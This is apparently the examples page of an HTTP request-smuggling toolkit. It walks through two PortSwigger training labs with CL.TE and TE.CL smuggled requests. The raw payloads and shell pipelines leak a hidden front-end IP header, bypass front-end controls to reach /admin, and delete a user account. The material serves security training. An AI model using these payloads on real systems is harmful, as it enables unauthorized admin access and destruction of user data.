# Examples


Use example of:
* [`httpcustomhouse`](https://github.com/ariary/HTTPCustomHouse): to simulate server behavior regarding `Content-Length` and chunk encoding
* [`httpoverride`](https://github.com/ariary/HTTPCustomHouse): to change headers of raw request for people not at ease with `sed` 
* [`httpecho`](https://github.com/ariary/httpecho): HTTP echo server echoing request exactly as it is received
* [`httpclient`](https://github.com/ariary/HTTPCustomHouse): `curl` for raw packet because curl, golang http client rewrite packet and `ncat` or `openssl s_client` aren't satisfying

## Analyze `TE.CL` request treatment

As we want to see how a request is treated and thus how we could interfere this treatment, we will simulate it.

**First**, The front-end server treats the request using `Content-Length` header:
```shell
cat request | httpcustomhouse -cl
## Output is the request transmitted to front-end
```

**Then**, The front use `chunk` encoding to parse HTTP request:
```shell
cat request | httpcustomhouse -cl | httpcustomhouse -te
## Output is the request treated by back end
```

**Finally**, if we want to see if there is some part of `request` that hasn't been treated by backend and thus will be interpreted as the beginning of the next request:
```shell
cat request | httpcustomhouse -cl | httpcustomhouse -te -r
## Output is the request treated by back end
## Color output: the part of the request not treated by backend
## TRICK: add 2>&1 >/dev/null at the end to only obtain the non-treated part
```

## Analyze `CL.TE` request treatment

Same as [`TE.CL`](#analyze-tecl-request-treatment) idea:

First parse request using `chunk` encoding, then using `Content-Length` and finally print part of the request not already treated by back end:
```shell
cat request | httpcustomhouse -te | httpcustomhouse -cl -r
## Output is the request treated by back end
## Color output: the part of the request not treated by backend
## TRICK: add 2>&1 >/dev/null at the end to only obtain the non-treated part
```



## Exploiting HTTP request smuggling to reveal front-end request rewriting

The following example is an alternative to PortSwigger Burp solution for their [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting).


Also to reproduce steps, Export an env var for the lab endpoint:
```shell
export LAB_URL=[YOUR_LAB_URL]
```

Browsing `/admin` endpoint we've got: `Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1`

We also know that:
* The front-end server adds an HTTP header to incoming requests containing their IP address. We have to find its name
* The front-end does not support chunk encoding


### I - Find a POST parameter that is reflected in response
use [`arjun`](https://github.com/s0md3v/Arjun), a tool to detect parameters for URL:
```shell
arjun -u https://$LAB_URL
[...]
[+] Heuristic scanner found 1 parameter: search
```

Confirm it with curl request:
```shell
curl -X POST https://$LAB_URL -s --data "search=toto" | grep "toto" -C 10 --color
[...]                    <section class=blog-header>
                        <h1>0 search results for 'toto'</h1>
                        <hr>
                    </section>
[...]
```
Indeed, the `search` parameter is reflected in h1 tag

### II - Construct legitimate request that reflect parameters
```shell
# in one shell
httpecho -d search
# in another shell
curl -X POST http://localhost:8888/ --data "search=toto" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:'
# empty headers to withdraw curl default ones
```

### III - Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal

To smuggle the request "embed" it in a normal request. The request will include a large Content-Length. As the back-end use it, it will also include the first characters of the next request (which is provided by front end) **=> Added front-end headers can thus be accessible in the response 💥**:

***The request:***
```shell
POST / HTTP/1.1
Host: [LAb_URL]
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0         #<---- End of 1st request for back-end

POST / HTTP/1.1   #<---- Begin of 2nd request for back-end
Content-Type: application/x-www-form-urlencoded
Content-Length: 200 #<---- Make back-end waiting for 200 bytes to treat it has a full request
Connection: close

search=test #<---- End of 1st request for front-end, backend waiting for the other bytes
```

To construct this request:

**1.** Modify the search request with a larger `Content-Length` + w/o `Host` + add `Connection: close` (close teh Connection between server and client to be sure to get the response):
```shell
cat search | httpoverride -cl 200 -H Host -H "Connection:close" > search_modify
```

**2.** Add end of chunk encoding before the `search_modify` request, it is the payload:
```shell
# Add end of chunk encoding:
printf "0\r\n\r\n$(cat search_modify)" > payload
```

**3.** Construct the smuggle request (with `httpecho`):
```shell
curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle

```
Before sending request, check how it wil be interpreted by backend:
```shell
cat smuggle | httpcustomhouse -cl | httpcustomhouse -te -r  # check if the request is smuggled
cat smuggle | httpcustomhouse -cl | httpcustomhouse -te -r 2>&1 >/dev/null | httpcustomhouse -cl # smuggle request treatment
```

Send the request:
```shell
cat smuggle | httpclient https://$LAB_URL
```

💥 Send it twice. In the second response, as expected we obtain the header of the request including one adde by front-end: (search for `X-*-IP` after search):
```shell
cat smuggle | httpclient https://$LAB_URL > smuggle_response
# To directly have Header value
cat smuggle_response| grep searc -A 1 -m 1 | cut -d ":" -f 1 | cut -d$'\n' -f2
```

**We now have our secret header to overwrite: `X-*-IP`**

### IV - Use secret header to reach admin panel

Smuggle a request with the secret header pointing to 127.0.0.1. We include it in a smuggled request to prevent it from being rewritten by front-end

```shell
POST / HTTP/1.1
Host: [LAB_URL]
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0           # <---- End of 1st request for back-end

GET /admin HTTP/1.1       # <---- Second request for back-end
X-*-Ip: 127.0.0.1     # <---- Secret Header
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

Construct this request:
```shell
export SERCRET_HEADER=[secret_header]
#Launch server
httpecho -s
# Construct a POST request to /admin
curl -s http://localhost:8888/admin -X GET --data "x=1" -H "Content-Length: 10" -H "Connection: close" -H 'User-Agent:'  -H 'Accept:' > admin
cat admin | httpoverride -H "Host:" -H "$SECRET_HEADER: 127.0.0.1" > admin_modify
# Adjust body to smuggle /admin request
printf "0\r\n\r\n$(cat admin_modify)" > payload
curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle
# Perform the request
cat smuggle | httpclient https://$LAB_URL
```

#### Delete user

Same thing as above, this time ask for `/admin/delete?username=carlos` endpoint:
```shell
#Launch server
httpecho -s
# Construct a POST request to /admin/delete to delete user
curl -s http://localhost:8888/admin/delete?username=carlos -X GET --data "x=1" -H "Content-Length: 10" -H "Connection: close" -H 'User-Agent:'  -H 'Accept:' > delete
cat delete | httpoverride -H "Host:" -H "$SECRET_HEADER: 127.0.0.1" > delete_modify
# Adjust body to smuggle /admin/delete request
printf "0\r\n\r\n$(cat delete_modify)" > delete_payload
curl -s -X POST http://localhost:8888/ --data-binary "@delete_payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > delete_smuggle
# Perform the request
cat delete_smuggle | httpclient https://$LAB_URL
```

## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

The following example is an alternative to PortSwigger Burp solution for their [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl).

We know that:
* back-end server doesn't support chunked encoding
* there's an admin panel at `/admin`, but the front-end server blocks access to it

We will smuggle an `/admin` request:
```shell
POST / HTTP/1.1
Host: ac7d1fb41fa9b18fc0174145006d00f9.web-security-academy.net
Transfer-Encoding: chunked    # <----- use by front-end
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

60          <----- end of request for the back-end
POST /admin HTTP/1.1        <----- 2nd request for back-end
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

x=1
0     # <----- end of request for the front-end

```

To construct this request:

**1.** construct the `/admin`request:
```shell
httpecho -d admin
curl http://localhost:8888/admin -H "Host:" -H 'User-Agent:'  -H 'Accept:' -X POST --data 'x=1' -H 'Content-Length: 15'
```

**2.** Smuggle it within legit request:
```shell
httpecho -d smuggle_admin
curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@admin"
```

**3.** Check request treatment by back-end:
```shell
cat smuggle_admin | httpcustomhouse -te | httpcustomhouse -cl -r
```

**4.** Send it
```shell
cat smuggle_admin | httpclient https://$LAB_URL
cat smuggle_admin | httpclient https://$LAB_URL # twice to get result for the smuggled request
[...]
Admin interface only available to local users
```

You can only access admin panel from localhost -> add `Host: localhost` for the smuggling request:
```shell
cat admin | httpoverride --host "localhost" > admin_localhost
httpecho -d smuggle_admin_localhost
curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@admin_localhost"
cat smuggle_admin_localhost | httpclient https://$LAB_URL
cat smuggle_admin_localhost | httpclient https://$LAB_URL #twice
[...]
                        <h1>Users</h1>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>  # <---- what we want
                        </div>

```

**~> Delete account**

Change the smuggle request to a `GET`on `/admin/delete?username=carlos`:
```shell
httpecho -d delete
curl http://localhost:8888/admin/delete?username=carlos -H "Host: localhost" -H 'User-Agent:'  -H 'Accept:' -X POST --data 'x=1' -H 'Content-Length: 15'
httpecho -d smuggle_delete
curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@delete"
cat smuggle_delete | httpclient https://$LAB_URL #twice
```


